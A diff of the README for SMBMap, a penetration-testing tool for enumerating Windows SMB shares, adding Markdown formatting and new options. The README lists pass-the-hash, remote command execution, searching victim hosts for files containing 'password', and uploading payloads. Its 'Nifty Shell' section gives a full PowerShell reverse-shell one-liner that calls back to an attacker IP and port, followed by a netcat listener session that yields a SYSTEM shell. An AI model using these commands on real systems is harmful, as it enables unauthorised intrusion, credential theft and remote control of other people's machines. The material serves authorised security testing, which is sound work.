@@ -10,12 +10,15 @@ You'll need Impacket to use this tool:
 
 https://code.google.com/p/impacket/
 
-Features:
-Pass-the-hash Support
-File upload/download/delete
-Permission enumeration (writable share, meet Metasploit)
-Remote Command Execution
+## Features:
+- Pass-the-hash Support
+- File upload/download/delete
+- Permission enumeration (writable share, meet Metasploit)
+- Remote Command Execution
+- Distrubted file content searching (new!)
+- File name matching (with an auto downoad capability)
 
+```
 SMBMap - Samba Share Enumerator
 Shawn Evans - Shawn.Evans@gmail.com
 
@@ -25,7 +28,7 @@ $ cat smb_ip_list.txt | python smbmap.py -u jsmith -p password1 -d workgroup
 $ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group "Domain Admins" /domain'
 
 -P      port (default 445), ex 139
--h      Hostname or IP
+-h      IP of host
 -u      Username, if omitted null session assumed
 -p      Password or NTLM hash
 -s      Share to use for smbexec command output (default C$), ex 'C$'
@@ -34,16 +37,19 @@ $ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net grou
 -R      Recursively list dirs, and files (no share\path lists ALL shares), ex. 'C$\Finance'
 -A      Define a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex "(web|global).(asax|config)"
 -r      List contents of directory, default is to list root of all shares, ex. -r 'c$\Documents and Settings\Administrator\Documents'
--F      File content filter, -F "password" (requies admin access to execute commands, and powershell on victim host)
+-F      File content search, -F '[Pp]assword' (requies admin access to execute commands, and powershell on victim host)
+--search-path   Specify drive/path to search (used with -F, default C:\Users), ex 'D:\HR\'
 -D      Download path, ex. 'C$\temp\passwords.txt'
+-L      List all drives on a host
 --upload-src    File upload source, ex '/temp/payload.exe'  (note that this requires --upload-dst for a destiation share)
 --upload-dst    Upload destination on remote host, ex 'C$\temp\payload.exe'
 --del       Delete a remote file, ex. 'C$\temp\msf.exe'
 --skip      Skip delete file confirmation prompt
 -q      Disable verbose output (basically only really useful with -A)
+```
 
-
-Sample Output:
+## Sample Output:
+```
 $ cat smb-hosts.txt | python smbmap.py -u jsmith -p 'R33nisP!nckl3' -d ABC
 [+] Reading from stdin
 [+] Finding open SMB ports....
@@ -78,19 +84,25 @@ Members
 -------------------------------------------------------------------------------
 abcadmin                  
 The command completed successfully.
-Nifty Shell:
-Run Powershell Script on Victim SMB Host
+```
 
+## Nifty Shell:
+Run Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)
+```
 $ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
 [+] Finding open SMB ports....
 [+] User SMB session establishd...
 [+] IP: 192.168.2.50:445        Name: unkown                                            
 [!] Error encountered, sharing violation, unable to retrieve output
-Attackers Netcat Listener
+```
 
+## Attackers Netcat Listener
+
+```
 $ nc -l 4445
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>whoami
  nt authority\system
+```
